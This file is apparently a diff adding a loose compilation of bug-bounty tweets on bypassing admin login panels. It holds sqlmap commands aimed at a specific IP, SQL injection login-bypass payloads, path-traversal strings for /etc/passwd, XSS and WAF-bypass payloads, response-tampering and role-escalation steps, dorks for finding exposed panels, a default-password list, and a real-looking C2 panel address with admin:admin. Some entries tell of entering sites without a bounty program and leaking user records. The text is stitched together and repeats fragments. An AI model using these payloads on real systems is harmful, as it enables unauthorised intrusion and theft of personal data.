@@ -1,0 +1,741 @@
+admin panel bypass
+=============
+
+
+sqlmap -u "https[:]//sub[.]example[.]com/login.php" --data "username=admin&password=admin" -p "username,password" --method POST
+
+sqlmap -u "https://34.247.21.242/login" --data "username=admin&password=admin" -p "username,password" --method POST
+
+default redientials  https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv
+
+one line to get admin login page or panel
+
+cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin
+cat domains_list.txt | httpx -ports 80,443,8080,8443 -paths "wordlist.txt" -mr "password"
+
+Bug- Admin Panel Access @Kanhaiya_sh4rma
+Steps
+1- Visit login panel
+2- Enter username= admin and random password
+3- click login & capture in burp
+4- Do intercept 
+5- Update {"status":"0"} to
+{"status":"1","user_type":"admin"}
+6- Admin console :) 
+
+🇸🇦 ROOD | GOAT
+@0x_rood
+·
+Sep 26, 2021
+Improper access control in 5 minutes
+
+1- use ffuf in your target
+2- phpMyAdmin/ —> 200 ok
+3- phpmyadmin login page
+4- add /setup to your link
+5- phpmyadmin/setup/
+6- when you are lucky you can see setup new servers page
+
+
+
+Username: author , password: author
+
+Ever find a phpMyAdmin login portal and default creds wont work?
+
+Try to access the /phpmyadmin/setup/ endpoint and you might be presented with authentication bypassed configurable admin panel.
+
+
+https://34.247.21.242/admin  ---302
+https://34.247.21.242/admin..'/   --200 
+
+
+1- phpmyadmin setup is enabled
+2- kanboard is login page on port 45001 with admin:admin credentials help shodan ext
+
+
+1. Found credentials on http://dehashed.com
+2. Applied on http://admin.site.com = Protected with OTP
+3. Bypassed using API
+4. https://admin.site.com/api/login?user
+
+
+- Tips: 
+Try the simplest things
+
+- Shodan dork:
+ssl:"target[.]com" http.title:"index of / " 
+I was redirected to the login page _ port: 8888
+
+ - Username: admin2
+ -  Password: 123456 
+
+
+
+Grafana Admin Panel Access👇
+
+While preparing for my Exams Randomly I opened One Big Company Website (Obviously Don't have Bug-bounty). 
+- I just run the exposed panels Nuclei Template.
+- Found Grafana Login panel.
+- Tried admin : admin 
+- Logged_in
+-asked for change password :)
+
+
+1- Go to admin. site.tld/login
+2- Tried to login with wrong credentials     > error
+3- Send to burp repeater 
+4- Found new parameter filename because of error
+5- tried payload
+../../../../../../../../../../../../etc/passwd
+6- Full LFI ✅
+
+
+Most weird bug, that’s i discovered
+Part 1
+
+1- admin login page, put any credentials and change response from 422 to 200 OK
+2- it login me to empty panel than after 2 seconds redirect me to login page
+3- but if you back to burp suite history you will see header with authorization token (fixed value) 
+4- and see some api endpoints in history that’s leaks some PII
+5- I play with request body to leak all users data 18000+ users
+
+
+1- intercept request
+2- login
+3- when I forward between requests
+4- i found request on path that’s called /users/permissions 
+5- do intercept > respnse on this request
+6- i found (“admin”, “false”, admin_id “0”)
+7- i change false to true and 0 to 1
+8- privilege
+
+
+1- found port 8080 open http://Target.com:8080
+2- admin panel login page
+3- test:test
+4- access to admin panel
+
+
+~Admin Panel Accessed via sqli
+#bugbountytips @0xmahmoudJo0
+1- Search for Login panels through @shodanhq
+ with this dork:
+
+org:"TARGET" http.title:"login"
+
+2- Bypass login with old way:
+admin' or 1=1
+admin' or 1=1--
+Or
+admin' or '1'='1
+
+
+some crazy scenario just happened to me 
+1.found an admin panel where there is login and forget password 
+2. pressed forget password > next page :
+crazystuff/admin/resetpass.html?email=<any email>
+and there is no asking for old password in that page
+just new password and confirm
+
+
+When you test for SQLi in a login form, don't give up after your first payload. Sometimes it takes a bit different payload, depends on the query at the server.
+I found SQLi auth bypass with this:
+admin')&password=')+or+30>10/*
+
+
+Add this endpoint for you wordlist 
+phpldapadmin/index.php
+and try get default login 
+and if there's no luck 
+try this 2 XSSs
+domain/phpldapadmin/cmd.php
+domain/cmd.php
+cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27Orwa%27)%3C/ScRiPt%3E&meth=ajax&server_id=1
+cmd.php?server_id=<script>alert('Orwa')</script>
+you can also try replace cmd.php to index.php
+
+
+1- Found path for portal in wayback
+2- Fuzz it
+3- Found login page
+4- Another Fuzzing
+5- See /manage-users.php with big content length but 302 status
+6- Setup match & replace with 302 to 200
+7- Bypass authentication and access to admin panel
+Congratulations 🥳 
+you forget add for your tip (Delete Location Header)
+Mostly without deleting location header the bypass will not work
+many people asked me what's my wordlist i posted 3 times before now this is last tweet about it
+general wordlist: https://raw.githubusercontent.com/maurosoria/dirsearch/master/db/dicc.txt
+for PHP: https://wordlists-cdn.assetnote.io/data/automated/httparchive_php_2020_11_18.txt
+for asp, aspx: https://wordlists-cdn.assetnote.io/data/automated/httparchive_aspx_asp_cfm_svc_ashx_asmx_2020_11_18.txt
+for java applictions: https://wordlists-cdn.assetnote.io/data/automated/httparchive_jsp_jspa_do_action_2022_08_28.txt
+
+
+Bug- Admin Panel Access
+Steps
+1- Visit login panel
+2- Enter username= admin and random password
+3- click login & capture in burp
+4- Do intercept 
+5- Update {"status":"0"} to
+{"status":"1","user_type":"admin"}
+6- Admin console :)
+
+
+wait wait, who's back?
+first it's webmail page
+- fuzzing the site get /adminconsole/ it's admin login page
+- /adminconsole/FUZZ
+- get /adminconsole/install.htm
+- they take me to settings page that's disclose admin pass and sql info
+- admin panel pwn
+
+
+read it again , I tried on all subdomains login pages
+1- view source domain.tld 
+2- Found jwt token token
+3- decoded at http://jwt.io
+4- Found admin username & email
+5- Tested credentials 
+username :: username ( passwd same as username ) 
+on each subdomain login page
+6- Pwned 2 admin panels
+
+
+Google Dork - Login Pages 🔑
+
+inurl:login | inurl:signin | intitle:login | intitle:signin | inurl:secure site:example[.]com
+
+
+Quick Bounty Tip:
+1. Admin user disable the user1@gmail.com accont
+2. Now user1@gmail.com wont be able 
+3. As an attacker go to password reset page and request password reset link and set new password
+Now login with newly set password even if the account is disabled
+
+
+private webapp admin access endpoint
+
+/dev/register/
+/stag/register/
+/dev/login/
+/register/
+/internal/
+/stag/
+
+private webapp admin access subdomains
+
+dev.
+stag.
+admin.
+internal.
+stag-dev.
+stag-admin.
+internal-dev.
+
+
+
+Cool Blind #SQLi. The target has an admin login page where certain methods are allowed. I found the API endpoint for the admin login and sent the same payload. Success.  
+
+POST /admin/login ==> 405 
+POST /api/v01/admin/login ==> 200 OK + Blind SQLi 
+
+A lot of ways.. fuzz, API docs, Katana...   endpoint
+
+
+http.title:"admin panel" org:<TARGET ORGANIZATION>
+
+"http.title:\"index of\" AND org:<TARGET ORGANIZATION>"
+
+"http.title:\"Dashboard [Jenkins]\" AND org:<TARGET ORGANIZATION>"
+
+"http.title:\"login\" AND org:<TARGET ORGANIZATION>"
+
+
+
+1- use ffuf in subdomain
+2- /phpldapadmin/ -> 200 ok
+3- admin login page
+4- try to access admin panel
+5- see check box (anonymous login)
+6- access with anonymous and read privileges 
+7- triaged report with high severity 😎
+
+
+Keep pwning same program:
+
+Found first P1 in jan 2022 and now it’s dec - still finding bugs here
+
+1- url/FUZZ 
+2- url/web/admin/home
+3- Found login 
+4- Enter [ admin@domain .com :: Admin@1 ]
+
+
+
+
+RCE story
+
+http://1.site.com/admin
+Forbidden
+2.HTTP header in request - Login page access   Used X-Original-URL: /ADMIN
+3. Sqli queries tried no success
+4. Some recon on gitlab - Found base64 pwd - decrypt
+5. Accessed admin panel
+6. Admin panel customized - CLI available
+7. File read successful
+
+
+
+
+Try access /admin path without follow redirects {tampering}:
+
+~http://target.com/admin –> HTTP 302 (redirect to login page)
+~http://target.com/admin%20/ -> HTTP 200 OK
+~http://target.com/%20admin%20/ -> HTTP 200 OK
+~http://target.com/admin%20/page -> HTTP 200 OK
+#bugbounty #bugbountytips
+
+
+
+Validation vulnerability
+Functionality: After verifying username it goes to account dashboard
+1.Found admin username
+2. GET request with verified=false , I changed it to true but response is 403 forbidden.
+3. So I changed response to 302 Found /dashboard
+site.com/emailid=admin@site.com&verified=false
+
+Changed to true->403 Forbidden
+
+Response charged to 302 Found /dashboard
+Admin access successful
+
+
+
+Bug : PHPMYADMIN Setup is accessible without authentication
+
+Tip: setup/index.php
+can you please confirm me that it's "/setup/index.php" or "/phpmyadmin/setup/index.php" thanks!
+
+
+
+
+
+
+Hello #infosec guys!! Can anyone tell me how to bypass this admin login portal ? After entering a wrong password, parameter be like --> https://
+1) Directory fuzzing
+2) Look in source code and in js files for some endpoints or credentials
+3) SQL injection to bypass login panel
+
+
+
+
+1- Go to  /wp-login.php?action=register
+2- Register with the name admin if it is available 
+3- Go to the email 
+4- Then you will see  that the registration has been completed. Log in to the admin panel. and congratulations, you have obtained admin permission
+
+
+
+
+P1 in 5 min
+
+1. Bruteforce on website after '/'
+2. Got /admin  directory.
+3. bruteforce on /admin/ 
+4. found admin/register.php
+5. register username as admin 
+6. then goto /login.php enter creds 
+7. Boom😂😂
+
+
+1.Subdomain enumeration
+2.port scan   naabu -list sub.txt -top-ports 1000 -exclude-ports 80,443 -o file
+3.found admin panel in open port.
+4.Try admin admin and login as admin.
+naabu -list sub.txt -top-ports 1000 -exclude-ports 80,443 -o file
+
+
+
+few ways to try on #admin 
+- Default login ( panel based - google ) 
+- Response manipulation 
+- Admin bruteforce with top 10k passwords 
+**only if bruteforce is in scope **
+-  Fuzz for hidden register/signup page then signup as admin (rare)
+
+
+
+
+First POC for paypal bounty
+
+1- Register as user
+2- In login, i see Role paramter in json body called ROLE_USER, copy this word and search about it at js files to see possible roles
+3- See ROLE_ADMIN, use match and replace for priv esc
+4- Now i'm admin
+
+
+
+1. Gau + Waybackurls = Collected endpoints
+2. Found http://site.com/sec/sec/admin/login/index
+3. Bypassed using sqli ('1 or 1 =' 1)
+4. RCE through Node.js deserialization
+
+
+
+/45.83.176.85:7443/covenantuser/login
+admin:admin
+
+
+mynet forum"
+"Forum Admin"
+Amadey rename?
+
+
+1- find subdomain with http://crt.sh
+2- see interesting url
+3- full port scan   Nmap <ip> -p- and nabu
+4- port 3001 | open
+5- grafana admin portal
+6- use default credentials admin:admin
+7- success login to admin portal
+
+
+ Shodan dork
+ssl:http://target.com 200 ok
+- Got a few login pages. 
+- Github dork 
+"http://target.com" "password" 
+- Default Security mechanism with Gmail login, tried on other login pages. BOOM! Internal admin access!
+
+
+Payloads para sql inyection login bypass
+
+' or ''-'
+" or ""-"
+" or true--
+' or true--
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+
+
+
+
+P1 at second pic
+
+1- Register account, it need approval
+2- Admin approve account
+3- Found subdomain that's allowed me to login with my account via SSO
+4- Login and get access for specific function for all users with PII leaks for employee's
+
+
+
+1- Admin invite user
+2- User login
+3- In user login request there's parameter called role:"user"
+4- Use match & replace to changed it to role:"admin"
+5- Login with user, it's logout me directly
+6- But i see all informtion with burp via api endpoints
+
+
+
+1- Go to admin. site.tld/login
+2- Tried to login with wrong credentials     > error
+3- Send to burp repeater 
+4- Found new parameter filename because of error
+5- tried payload
+../../../../../../../../../../../../etc/passwd
+6- Full LFI ✅
+
+root
+wubao
+password
+123456
+admin
+12345
+1234
+p@ssw0rd
+123
+jiamima
+test
+root123
+!q@w
+!qaz@wsx
+idc!@
+admin!@
+alpine
+qwerty
+12345678
+111111
+123456789
+1q2w3e4r
+123123
+default
+1234567
+qwe123
+1qaz2wsx
+1234567890
+abcd1234
+000000
+user
+toor
+qwer1234
+1q2w3e
+asdf1234
+redhat
+1234qwer
+cisco
+12qwaszx
+test123
+1q2w3e4r5t
+admin123
+changeme
+1qazxsw2
+123qweasd
+q1w2e3r4
+letmein
+server
+root1234
+master
+abc123
+rootroot
+a
+system
+pass
+1qaz2wsx3edc
+p@$$w0rd
+112233
+welcome
+!QAZ2wsx
+linux
+123321
+manager
+1qazXSW@
+q1w2e3r4t5
+oracle
+asd123
+admin123456
+ubnt
+123qwe
+qazwsxedc
+administrator
+superuser
+zaq12wsx
+121212
+654321
+ubuntu
+0000
+zxcvbnm
+root@123
+1111
+vmware
+q1w2e3
+qwerty123
+cisco123
+11111111
+pa55w0rd
+asdfgh
+11111
+123abc
+asdf
+centos
+888888
+54321
+password123
+Administrator
+Admin
+
+
+
+
+
+1.Github 
+
+
+google.com "api"
+
+"org:google" "api"
+
+if you find api token check url valid or not valid
+
+url= https://github.com/streaak/keyhacks
+
+tool gitrob and keyhacks
+
+
+
+2.Blind xss
+
+contact and feed pages
+survers
+your password as blind xss
+chat application/forum
+custemer ticket appliction
+always use your name desigine
+in loging page
+name field and resert password
+usear agent header
+upgrading account
+
+xsshunter website
+
+
+
+3.Open Ports
+
+your deep recon
+find subdomain multiple tool 30+ tool use
+live list sub domain
+scan your list open ports
+try to sql 'or'1=1'
+you can read js file 
+
+
+4. Forced Browsing / brut forcing
+
+site:xyz.com/admin
+brutforce site:xyz.com/admin/template.asp   default admin cedintials
+read js file
+
+5. Tampeing
+
+response 302  change 200 read goodfather and hacker007 
+
+
+6. Reading source (js) file
+
+api token,secreat,internal endpoints.etc
+
+you can access admin portals
+
+username=test@test.com
+password= test
+
+
+1- Found path for portal in wayback
+2- Fuzz it
+3- Found login page
+4- Another Fuzzing
+5- See /manage-users.php with big content length but 302 status
+6- Setup match & replace with 302 to 200
+7- Bypass authentication and access to admin panel
+
+
+many people asked me what's my wordlist i posted 3 times before now this is last tweet about it
+
+
+1- Found login page in wayback
+2- Fuzzing parameter, found parameter called ID  tool use Arjun
+3- Fuzz ID with intruder in burp from 1-10000
+4- There’s some ID’s have different content-length 
+5- When i use url with these ID’s there’s JwT in response than redirect me to account
+
+
+sqlmap./py -r request./txt --dbs --random-agent --time-sec=12 --level=5 --risk=3 --batch --flush-session
+
+Command: sqlmap -u https://test\com/endpoint/./asp --dbs --random-agent --time-sec=12 --level=1 --risk=1 --batch --dbms mssql
+
+
+Xss is not easy finding
+
+1- Digging for vulnerable endpoint -> 4 Hours
+2- Find parameter with param miner
+3- Bypass waf -> 30 mins
+
+Payload: "><A%20%252F=""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>
+
+Sql injection is not necessary inject at payload,
+You can inject in path
+Path: /en/gallery/1
+POC: en/gallery/1'XOR(if(now()=sysdate(),sleep(3),0))OR'
+
+
+wp-config.php.bak
+wp-config.php.old
+wp-config.php
+
+
+1- Found login page
+2- Intercept POST login request
+3- Found parameter called config=
+4- But Payload ../../../../../../../../../etc/passwd
+5- Successfully read data
+
+1- Admin invite user
+2- User login
+3- In user login request there's parameter called role:"user"
+4- Use match & replace to changed it to role:"admin"
+5- Login with user, it's logout me directly
+6- But i see all informtion with burp via api endpoints
+
+
+Most weird bug, that’s i discovered
+Part 1
+
+1- admin login page, put any credentials and change response from 422 to 200 OK
+2- it login me to empty panel than after 2 seconds redirect me to login page
+3- but if you back to burp suite history you will see header with authorization token (fixed value) 
+4- and see some api endpoints in history that’s leaks some PII
+5- I play with request body to leak all users data 18000+ users
+
+Accepted as P4
+
+There’s tip here:
+The website give me 403 in every path or file
+How I bypass it?
+Just start burp suite so the ip changed to 127.0.0.1 and all paths and file open
+
+
+New tip
+
+1- Fuzz target
+2- phpmyadmin/setup/index.php --> 403
+3- phpMyAdminOLD/setup/index.php --> 200
+
+add phpMyAdminOLD/setup/index.php to your wordlist
+
+
+1- find subdomain: cms. compny. com
+2- sign in/up page
+3- sign up new account
+4- login
+5- i have full privileges and leak all PII for customers 🌚
+
+Quick tip
+
+- /robots.txt -> 404 Not Found
+- /robots.txt.dist -> Downloaded
+  
+when i register, in company input, i but blind xss payload that's it
+it's triggered after 5 day's from registration
+
+good list https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-words.txt
+
+
+Where i can collect JS files?
+
+1- Source page
+2- WaybackUrls
+3- Fuzzing with JS files list
+4- github of company
+5- Burpsuite Crawler
+
+https://xyz/backend/login > 302
+https://IP/backend/login > 200
+
+Access the backend Admin Panel! login with the default pass! 
+
+Always try to find the origin IP and FUZZ! (@GodfatherOrwa
+'s tip from @bsidesahmedabad
+, old but gold tip!) 
+
